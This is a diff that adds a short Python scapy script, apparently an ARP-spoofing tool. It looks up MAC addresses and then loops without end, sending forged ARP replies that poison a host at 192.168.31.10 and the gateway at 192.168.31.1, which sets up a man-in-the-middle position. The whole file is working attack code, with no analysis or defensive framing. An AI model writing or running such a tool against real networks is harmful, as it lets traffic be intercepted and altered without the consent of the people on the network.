@@ -1,0 +1,23 @@
+import scapy.all as scapy
+import time
+
+
+def getmac(ip):
+
+    arpreq = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arpbroad = broadcast/arpreq
+    ans = scapy.srp(arpbroad, timeout=1, verbose=False)[0]
+    return ans[0][1].hwsrc
+
+def spoof(target,spoofip):
+    tarmac = getmac(target)
+    a = scapy.ARP(op=2, pdst=target, hwdst=tarmac, psrc=spoofip)
+    scapy.send(a)
+count = 0
+while True:
+    spoof("192.168.31.10", "192.168.31.1")
+    spoof("192.168.31.1", "192.168.31.10")
+    count = count+2
+    print("[+] Packets sent:"+str(count))
+    time.sleep(2)
